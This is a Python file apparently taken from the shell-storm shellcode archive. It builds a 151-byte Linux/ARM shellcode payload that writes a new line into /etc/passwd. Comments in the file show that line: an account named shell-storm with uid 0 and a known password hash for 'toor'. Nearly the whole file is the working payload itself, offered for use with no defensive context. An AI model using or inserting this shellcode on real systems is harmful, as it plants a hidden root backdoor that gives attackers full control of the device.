#http://shell-storm.org/shellcode/files/shellcode-735.php
#Title:     Linux/ARM - add root user with password - 151 bytes
#Date:      2010-11-25
#Tested on: ARM926EJ-S rev 5 (v5l)
#Author:    Jonathan Salwan - twitter: @jonathansalwan
#http://shell-storm.org


#Must be test ..


def add_user( command):
      shellcode =  r"\x05\x50\x45\xe0" 
      shellcode += r"\x01\x50\x8f\xe2"  
      shellcode += r"\x15\xff\x2f\xe1" 
      shellcode += r"\x78\x46"         
      shellcode += r"\x7C\x30"      
      shellcode += r"\xff\x21"         
      shellcode += r"\xff\x31"        
      shellcode += r"\xff\x31"         
      shellcode += r"\xff\x31"        
      shellcode += r"\x45\x31"         
      shellcode += r"\xdc\x22"         
      shellcode += r"\xc8\x32"          
      shellcode += r"\x05\x27"        
      shellcode += r"\x01\xdf"         
      shellcode += r"\x80\x46"         
      shellcode += r"\x41\x46"        
      shellcode += r"\x08\x1c"         
      shellcode += r"\x79\x46"     
      shellcode += r"\x18\x31"         
      shellcode += r"\xc0\x46"       
      shellcode += r"\x48\x22"         
      shellcode += r"\x04\x27"       
      shellcode += r"\x01\xdf"        
      shellcode += r"\x41\x46"        
      shellcode += r"\x08\x1c"          
      shellcode += r"\x06\x27"        
      shellcode += r"\x01\xdf"         
      shellcode += r"\x1a\x49"         
      shellcode += r"\x08\x1c"          
      shellcode += r"\x01\x27"          
      shellcode += r"\x01\xdf"         
      shellcode += command

      #shell-storm:$1$KQYl/yru$PMt02zUTWmMvPWcU4oQLs/:0:0:root:/root:/bin/bash\n 
      #crypt.crypt('toor','$1$KQYl/yru')
      #'$1$KQYl/yru$PMt02zUTWmMvPWcU4oQLs/'
      #That's why I'm addict to python  ..

      #"\x73\x68\x65\x6c\x6c\x2d\x73\x74\x6f\x72"
      #"\x6d\x3a\x24\x31\x24\x4b\x51\x59\x6c\x2f"
      #"\x79\x72\x75\x24\x50\x4d\x74\x30\x32\x7a"
      #"\x55\x54\x57\x6d\x4d\x76\x50\x57\x63\x55"
      #"\x34\x6f\x51\x4c\x73\x2f\x3a\x30\x3a\x30"
      #"\x3a\x72\x6f\x6f\x74\x3a\x2f\x72\x6f\x6f"
      #"\x74\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73"
      #"\x68\x0a"
      shellcode += r"\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
      return shellcode
